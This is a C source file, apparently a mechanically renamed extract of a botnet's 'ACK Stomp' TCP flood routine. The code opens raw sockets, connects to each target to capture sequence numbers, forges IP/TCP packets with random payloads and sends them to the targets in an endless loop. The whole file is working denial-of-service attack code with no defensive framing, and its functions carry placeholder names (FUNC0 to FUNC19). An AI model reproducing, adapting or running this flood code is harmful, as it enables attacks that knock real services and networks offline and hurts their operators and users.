#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  int uint8_t ;
typedef  int uint32_t ;
typedef  int uint16_t ;
typedef  int time_t ;
struct tcphdr {int source; int ack; int seq; int ack_seq; int dest; int doff; int fin; int window; scalar_t__ check; void* rst; void* syn; void* psh; void* urg; } ;
struct TYPE_4__ {scalar_t__ s_addr; } ;
struct sockaddr_in {int sin_port; TYPE_2__ sin_addr; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct iphdr {int version; int ihl; int tos; int id; int ttl; scalar_t__ daddr; scalar_t__ check; int /*<<< orphan*/  saddr; int /*<<< orphan*/  protocol; void* frag_off; void* tot_len; } ;
struct TYPE_3__ {int sin_port; } ;
struct attack_target {int netmask; int addr; TYPE_1__ sock_addr; } ;
struct attack_stomp_data {scalar_t__ addr; int seq; int ack_seq; int sport; int dport; } ;
struct attack_option {int dummy; } ;
typedef  int socklen_t ;
typedef  int port_t ;
typedef  int /*<<< orphan*/  pktbuf ;
typedef  void* BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  ATK_OPT_ACK ; 
 int /*<<< orphan*/  ATK_OPT_DPORT ; 
 int /*<<< orphan*/  ATK_OPT_FIN ; 
 int /*<<< orphan*/  ATK_OPT_IP_DF ; 
 int /*<<< orphan*/  ATK_OPT_IP_IDENT ; 
 int /*<<< orphan*/  ATK_OPT_IP_TOS ; 
 int /*<<< orphan*/  ATK_OPT_IP_TTL ; 
 int /*<<< orphan*/  ATK_OPT_PAYLOAD_RAND ; 
 int /*<<< orphan*/  ATK_OPT_PAYLOAD_SIZE ; 
 int /*<<< orphan*/  ATK_OPT_PSH ; 
 int /*<<< orphan*/  ATK_OPT_RST ; 
 int /*<<< orphan*/  ATK_OPT_SYN ; 
 int /*<<< orphan*/  ATK_OPT_URG ; 
 int FALSE ; 
 int /*<<< orphan*/  F_GETFL ; 
 int /*<<< orphan*/  F_SETFL ; 
 int /*<<< orphan*/  IPPROTO_IP ; 
 int /*<<< orphan*/  IPPROTO_TCP ; 
 int /*<<< orphan*/  IP_HDRINCL ; 
 int /*<<< orphan*/  LOCAL_ADDR ; 
 int /*<<< orphan*/  MSG_NOSIGNAL ; 
 int O_NONBLOCK ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int TRUE ; 
 void* FUNC0 (int,struct attack_option*,int /*<<< orphan*/ ,int) ; 
 void* FUNC1 (int,int) ; 
 scalar_t__ FUNC2 (int*,int) ; 
 scalar_t__ FUNC3 (struct iphdr*,struct tcphdr*,void*,int) ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 int /*<<< orphan*/  FUNC5 (int,struct sockaddr*,int) ; 
 scalar_t__ errno ; 
 int FUNC6 (int,int /*<<< orphan*/ ,int) ; 
 scalar_t__ FUNC7 (void*) ; 
 void* FUNC8 (int) ; 
 char* FUNC9 (int) ; 
 void* FUNC10 (int) ; 
 int /*<<< orphan*/  FUNC11 (char*,...) ; 
 int FUNC12 () ; 
 int /*<<< orphan*/  FUNC13 (char*,int) ; 
 int FUNC14 (int,char*,int,int /*<<< orphan*/ ,struct sockaddr*,int*) ; 
 int /*<<< orphan*/  FUNC15 (int,char*,int,int /*<<< orphan*/ ,struct sockaddr*,int) ; 
 int FUNC16 (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*,int) ; 
 int FUNC17 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int FUNC18 (int /*<<< orphan*/ *) ; 

void FUNC19(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    struct attack_stomp_data *stomp_data = FUNC1(targs_len, sizeof (struct attack_stomp_data));
    char **pkts = FUNC1(targs_len, sizeof (char *));
    uint8_t ip_tos = FUNC0(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = FUNC0(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = FUNC0(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = FUNC0(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t dport = FUNC0(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    BOOL urg_fl = FUNC0(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = FUNC0(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = FUNC0(opts_len, opts, ATK_OPT_PSH, TRUE);
    BOOL rst_fl = FUNC0(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = FUNC0(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = FUNC0(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = FUNC0(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 768);
    BOOL data_rand = FUNC0(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    // Set up receive socket
    if ((rfd = FUNC17(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Could not open raw socket!\n");
#endif
        return;
    }
    i = 1;
    if (FUNC16(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        FUNC4(rfd);
        return;
    }

    // Retrieve all ACK/SEQ numbers
    for (i = 0; i < targs_len; i++)
    {
        int fd;
        struct sockaddr_in addr, recv_addr;
        socklen_t recv_addr_len;
        char pktbuf[256];
        time_t start_recv;

        stomp_setup_nums:

        if ((fd = FUNC17(AF_INET, SOCK_STREAM, 0)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create socket!\n");
#endif
            continue;
        }

        // Set it in nonblocking mode
        FUNC6(fd, F_SETFL, FUNC6(fd, F_GETFL, 0) | O_NONBLOCK);
 
        // Set up address to connect to
        addr.sin_family = AF_INET;
        if (targs[i].netmask < 32)
            addr.sin_addr.s_addr = FUNC7(FUNC10(targs[i].addr) + (((uint32_t)FUNC12()) >> targs[i].netmask));
        else
            addr.sin_addr.s_addr = targs[i].addr;
        if (dport == 0xffff)
            addr.sin_port = FUNC12() & 0xffff;
        else
            addr.sin_port = FUNC8(dport);

        // Actually connect, nonblocking
        FUNC5(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
        start_recv = FUNC18(NULL);

        // Get info
        while (TRUE)
        {
            int ret;

            recv_addr_len = sizeof (struct sockaddr_in);
            ret = FUNC14(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
            if (ret == -1)
            {
#ifdef DEBUG
                printf("Could not listen on raw socket!\n");
#endif
                return;
            }
            if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && ret > (sizeof (struct iphdr) + sizeof (struct tcphdr)))
            {
                struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof (struct iphdr));

                if (tcph->source == addr.sin_port)
                {
                    if (tcph->syn && tcph->ack)
                    {
                        struct iphdr *iph;
                        struct tcphdr *tcph;
                        char *payload;

                        stomp_data[i].addr = addr.sin_addr.s_addr;
                        stomp_data[i].seq = FUNC10(tcph->seq);
                        stomp_data[i].ack_seq = FUNC10(tcph->ack_seq);
                        stomp_data[i].sport = tcph->dest;
                        stomp_data[i].dport = addr.sin_port;
#ifdef DEBUG
                        printf("ACK Stomp got SYN+ACK!\n");
#endif
                        // Set up the packet
                        pkts[i] = FUNC9(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph = (struct iphdr *)pkts[i];
                        tcph = (struct tcphdr *)(iph + 1);
                        payload = (char *)(tcph + 1);

                        iph->version = 4;
                        iph->ihl = 5;
                        iph->tos = ip_tos;
                        iph->tot_len = FUNC8(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph->id = FUNC8(ip_ident);
                        iph->ttl = ip_ttl;
                        if (dont_frag)
                            iph->frag_off = FUNC8(1 << 14);
                        iph->protocol = IPPROTO_TCP;
                        iph->saddr = LOCAL_ADDR;
                        iph->daddr = stomp_data[i].addr;

                        tcph->source = stomp_data[i].sport;
                        tcph->dest = stomp_data[i].dport;
                        tcph->seq = stomp_data[i].ack_seq;
                        tcph->ack_seq = stomp_data[i].seq;
                        tcph->doff = 8;
                        tcph->fin = TRUE;
                        tcph->ack = TRUE;
                        tcph->window = FUNC12() & 0xffff;
                        tcph->urg = urg_fl;
                        tcph->ack = ack_fl;
                        tcph->psh = psh_fl;
                        tcph->rst = rst_fl;
                        tcph->syn = syn_fl;
                        tcph->fin = fin_fl;

                        FUNC13(payload, data_len);
                        break;
                    }
                    else if (tcph->fin || tcph->rst)
                    {
                        FUNC4(fd);
                        goto stomp_setup_nums;
                    }
                }
            }

            if (FUNC18(NULL) - start_recv > 10)
            {
#ifdef DEBUG
                printf("Couldn't connect to host for ACK Stomp in time. Retrying\n");
#endif
                FUNC4(fd);
                goto stomp_setup_nums;
            }
        }
    }

    // Start spewing out traffic
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            if (ip_ident == 0xffff)
                iph->id = FUNC12() & 0xffff;

            if (data_rand)
                FUNC13(data, data_len);

            iph->check = 0;
            iph->check = FUNC2((uint16_t *)iph, sizeof (struct iphdr));

            tcph->seq = FUNC8(stomp_data[i].seq++);
            tcph->ack_seq = FUNC8(stomp_data[i].ack_seq);
            tcph->check = 0;
            tcph->check = FUNC3(iph, tcph, FUNC8(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);

            targs[i].sock_addr.sin_port = tcph->dest;
            FUNC15(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}